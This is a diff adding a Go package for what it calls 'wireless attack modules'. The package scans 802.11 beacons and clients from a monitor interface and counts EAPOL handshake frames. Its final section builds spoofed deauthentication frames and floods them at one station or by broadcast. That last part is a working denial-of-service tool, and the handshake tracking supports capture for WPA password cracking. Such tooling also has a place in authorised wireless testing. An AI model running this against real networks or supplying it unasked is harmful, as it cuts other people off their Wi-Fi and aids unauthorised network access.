@@ -1,0 +1,389 @@
+// Package wlan implements the 802.11 primitives used by the wireless attack
+// modules: passive beacon scanning, EAPOL handshake detection and
+// deauthentication-frame injection. All operations require a monitor-mode
+// interface opened in radio tap capture mode.
+package wlan
+
+import (
+	"errors"
+	"fmt"
+	"net"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+)
+
+// AP is a single access point observed from its beacon frames.
+type AP struct {
+	BSSID     net.HardwareAddr
+	SSID      string
+	Channel   uint8
+	RSSI      int8
+	Security  string // "open", "wep", "wpa", "wpa2"
+	FirstSeen time.Time
+	LastSeen  time.Time
+}
+
+// Client is a station observed on the air (probe requests or data frames).
+type Client struct {
+	MAC      net.HardwareAddr
+	AP       net.HardwareAddr // BSSID it is associated to, if any
+	LastSeen time.Time
+}
+
+// Handshake tracks an observed 802.11 authentication exchange.
+type Handshake struct {
+	AP       net.HardwareAddr
+	Client   net.HardwareAddr
+	Messages int // 1..4 EAPOL key frames observed
+	Complete bool
+	Started  time.Time
+}
+
+// Scanner passively inspects a monitor interface for beacons and clients.
+type Scanner struct {
+	iface   string
+	handle  *pcap.Handle
+	stopped chan struct{}
+
+	mu      sync.Mutex
+	aps     map[string]*AP
+	clients map[string]*Client
+	hs      map[string]*Handshake
+
+	Beacons atomic.Uint64
+	EAPOL   atomic.Uint64
+	Deauth  atomic.Uint64
+}
+
+// NewScanner opens a monitor interface in promiscuous radio-tap mode.
+func NewScanner(iface string) (*Scanner, error) {
+	handle, err := pcap.OpenLive(iface, 65535, true, 500*time.Millisecond)
+	if err != nil {
+		return nil, fmt.Errorf("wlan: open %s: %w", iface, err)
+	}
+	return &Scanner{
+		iface:   iface,
+		handle:  handle,
+		stopped: make(chan struct{}),
+		aps:     map[string]*AP{},
+		clients: map[string]*Client{},
+		hs:      map[string]*Handshake{},
+	}, nil
+}
+
+// Start begins the capture goroutine.
+func (s *Scanner) Start() {
+	go s.readLoop()
+}
+
+func (s *Scanner) readLoop() {
+	for {
+		select {
+		case <-s.stopped:
+			return
+		default:
+		}
+		data, ci, err := s.handle.ReadPacketData()
+		if err != nil {
+			select {
+			case <-s.stopped:
+				return
+			default:
+			}
+			continue
+		}
+		s.process(data, ci)
+	}
+}
+
+func (s *Scanner) process(data []byte, ci gopacket.CaptureInfo) {
+	packet := gopacket.NewPacket(data, layers.LayerTypeRadioTap, gopacket.NoCopy)
+	dot11Layer := packet.Layer(layers.LayerTypeDot11)
+	if dot11Layer == nil {
+		return
+	}
+	dot11, ok := dot11Layer.(*layers.Dot11)
+	if !ok {
+		return
+	}
+
+	rssi := int8(0)
+	if radio := packet.Layer(layers.LayerTypeRadioTap); radio != nil {
+		if rt, ok := radio.(*layers.RadioTap); ok {
+			rssi = int8(rt.DBMAntennaSignal)
+		}
+	}
+
+	switch {
+	case dot11.Type == layers.Dot11TypeMgmtBeacon:
+		s.Beacons.Add(1)
+		s.recordBeacon(packet, rssi, ci.Timestamp)
+	case dot11.Type == layers.Dot11TypeMgmtProbeReq:
+		s.recordProbe(dot11, rssi, ci.Timestamp)
+	case dot11.Type.MainType() == layers.Dot11TypeData:
+		s.recordData(dot11, rssi, ci.Timestamp)
+	case dot11.Type == layers.Dot11TypeMgmtDeauthentication,
+		dot11.Type == layers.Dot11TypeMgmtDisassociation:
+		s.Deauth.Add(1)
+	}
+}
+
+func (s *Scanner) recordBeacon(packet gopacket.Packet, rssi int8, ts time.Time) {
+	b, ok := packet.Layer(layers.LayerTypeDot11MgmtBeacon).(*layers.Dot11MgmtBeacon)
+	if !ok {
+		return
+	}
+	dot11 := packet.Layer(layers.LayerTypeDot11).(*layers.Dot11)
+	ssid, channel, security := parseBeacon(b)
+
+	s.mu.Lock()
+	key := string(dot11.Address2)
+	ap, found := s.aps[key]
+	if !found {
+		ap = &AP{}
+		s.aps[key] = ap
+	}
+	ap.BSSID = append(net.HardwareAddr(nil), dot11.Address2...)
+	if ap.SSID == "" {
+		ap.SSID = ssid
+	}
+	ap.Channel = channel
+	ap.Security = security
+	ap.RSSI = rssi
+	ap.LastSeen = ts
+	if !found {
+		ap.FirstSeen = ts
+	}
+	s.mu.Unlock()
+}
+
+func (s *Scanner) recordProbe(dot11 *layers.Dot11, rssi int8, ts time.Time) {
+	s.mu.Lock()
+	c, found := s.clients[string(dot11.Address2)]
+	if !found {
+		c = &Client{}
+		s.clients[string(dot11.Address2)] = c
+	}
+	c.MAC = append(net.HardwareAddr(nil), dot11.Address2...)
+	c.LastSeen = ts
+	s.mu.Unlock()
+}
+
+func (s *Scanner) recordData(dot11 *layers.Dot11, rssi int8, ts time.Time) {
+	var sta, bssid net.HardwareAddr
+	if dot11.Flags.ToDS() {
+		bssid, sta = dot11.Address1, dot11.Address2
+	} else {
+		bssid, sta = dot11.Address2, dot11.Address1
+	}
+	s.mu.Lock()
+	if c, found := s.clients[string(sta)]; found {
+		c.AP = append(net.HardwareAddr(nil), bssid...)
+		c.LastSeen = ts
+	} else {
+		s.clients[string(sta)] = &Client{MAC: sta, AP: bssid, LastSeen: ts}
+	}
+	s.mu.Unlock()
+}
+
+// privacyCapability is the capability-info bit that signals a WEP-enabled AP.
+const privacyCapability uint16 = 0x0010
+
+// parseBeacon extracts the SSID, channel and security mode from a beacon body.
+// The tags live in the beacon payload after the 12-byte fixed header.
+func parseBeacon(b *layers.Dot11MgmtBeacon) (ssid string, channel uint8, security string) {
+	security = "open"
+	contents := b.Payload
+	i := 0
+	for i+2 <= len(contents) {
+		tag := contents[i]
+		length := int(contents[i+1])
+		if i+2+length > len(contents) {
+			break
+		}
+		value := contents[i+2 : i+2+length]
+		switch tag {
+		case 0: // SSID
+			ssid = string(value)
+		case 3: // DS parameter set -> channel
+			if length >= 1 {
+				channel = value[0]
+			}
+		case 48: // RSN -> WPA2
+			security = "wpa2"
+		case 221: // vendor specific; check for WPA OUI
+			if isWPAOUI(value) && security == "open" {
+				security = "wpa"
+			}
+		}
+		i += 2 + length
+	}
+	if security == "open" && b.Flags&privacyCapability != 0 {
+		security = "wep"
+	}
+	return
+}
+
+func isWPAOUI(v []byte) bool {
+	return len(v) >= 4 && v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xf2 && v[3] == 0x01
+}
+
+// CountEAPOL inspects a data frame for EAPOL key messages and updates the
+// handshake table. It returns the BSSID/station pair and whether the observed
+// exchange is complete.
+func (s *Scanner) CountEAPOL(data []byte, ci gopacket.CaptureInfo) (bssid, sta net.HardwareAddr, complete bool) {
+	packet := gopacket.NewPacket(data, layers.LayerTypeRadioTap, gopacket.NoCopy)
+	dot11Layer := packet.Layer(layers.LayerTypeDot11)
+	if dot11Layer == nil {
+		return nil, nil, false
+	}
+	dot11, _ := dot11Layer.(*layers.Dot11)
+	if dot11 == nil || dot11.Type.MainType() != layers.Dot11TypeData {
+		return nil, nil, false
+	}
+	llcLayer := packet.Layer(layers.LayerTypeLLC)
+	if llcLayer == nil {
+		return nil, nil, false
+	}
+	if _, ok := llcLayer.(*layers.LLC); !ok {
+		return nil, nil, false
+	}
+	if snapLayer := packet.Layer(layers.LayerTypeSNAP); snapLayer != nil {
+		snap, ok := snapLayer.(*layers.SNAP)
+		if !ok || snap.Type != 0x888e {
+			return nil, nil, false
+		}
+	}
+	s.EAPOL.Add(1)
+
+	if dot11.Flags.ToDS() {
+		bssid, sta = dot11.Address1, dot11.Address2
+	} else {
+		bssid, sta = dot11.Address2, dot11.Address1
+	}
+
+	key := string(sta) + string(bssid)
+	s.mu.Lock()
+	h, found := s.hs[key]
+	if !found {
+		h = &Handshake{AP: bssid, Client: sta, Started: time.Now()}
+		s.hs[key] = h
+	}
+	h.Messages++
+	if h.Messages >= 4 {
+		h.Complete = true
+	}
+	complete = h.Complete
+	s.mu.Unlock()
+	return bssid, sta, complete
+}
+
+// APs returns a snapshot of all observed access points.
+func (s *Scanner) APs() []AP {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	out := make([]AP, 0, len(s.aps))
+	for _, a := range s.aps {
+		out = append(out, *a)
+	}
+	return out
+}
+
+// Clients returns a snapshot of all observed stations.
+func (s *Scanner) Clients() []Client {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	out := make([]Client, 0, len(s.clients))
+	for _, c := range s.clients {
+		out = append(out, *c)
+	}
+	return out
+}
+
+// Handshakes returns a snapshot of the handshake table.
+func (s *Scanner) Handshakes() []Handshake {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	out := make([]Handshake, 0, len(s.hs))
+	for _, h := range s.hs {
+		out = append(out, *h)
+	}
+	return out
+}
+
+// Close stops the capture loop and releases the interface.
+func (s *Scanner) Close() {
+	select {
+	case <-s.stopped:
+	default:
+		close(s.stopped)
+	}
+	s.handle.Close()
+}
+
+// BuildDeauth constructs a raw radio-tap 802.11 deauthentication frame that
+// can be injected on a monitor interface.
+func BuildDeauth(ap, sta net.HardwareAddr, reason layers.Dot11Reason) ([]byte, error) {
+	if len(ap) != 6 {
+		return nil, errors.New("wlan: ap MAC must be 6 bytes")
+	}
+	radioTap := &layers.RadioTap{}
+	dot11 := &layers.Dot11{
+		Type: layers.Dot11TypeMgmtDeauthentication,
+
+		Address1: sta,
+		Address2: ap,
+		Address3: ap,
+	}
+	deauth := &layers.Dot11MgmtDeauthentication{Reason: reason}
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{FixLengths: true}
+	if err := gopacket.SerializeLayers(buf, opts, radioTap, dot11, deauth); err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+// DeauthSender floods deauthentication frames. It opens its own injection
+// handle on the monitor interface.
+type DeauthSender struct {
+	handle *pcap.Handle
+}
+
+// NewDeauthSender opens an injection-capable handle.
+func NewDeauthSender(iface string) (*DeauthSender, error) {
+	handle, err := pcap.OpenLive(iface, 65535, true, 100*time.Millisecond)
+	if err != nil {
+		return nil, fmt.Errorf("wlan: open inject %s: %w", iface, err)
+	}
+	return &DeauthSender{handle: handle}, nil
+}
+
+// Flood sends count deauth frames from ap to sta (broadcast when sta is nil).
+func (d *DeauthSender) Flood(ap, sta net.HardwareAddr, count int, reason layers.Dot11Reason) (int, error) {
+	dst := sta
+	if len(dst) == 0 {
+		dst = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
+	}
+	frame, err := BuildDeauth(ap, dst, reason)
+	if err != nil {
+		return 0, err
+	}
+	sent := 0
+	for i := 0; i < count; i++ {
+		if err := d.handle.WritePacketData(frame); err != nil {
+			return sent, err
+		}
+		sent++
+		time.Sleep(2 * time.Millisecond)
+	}
+	return sent, nil
+}
+
+// Close releases the injection handle.
+func (d *DeauthSender) Close() { d.handle.Close() }
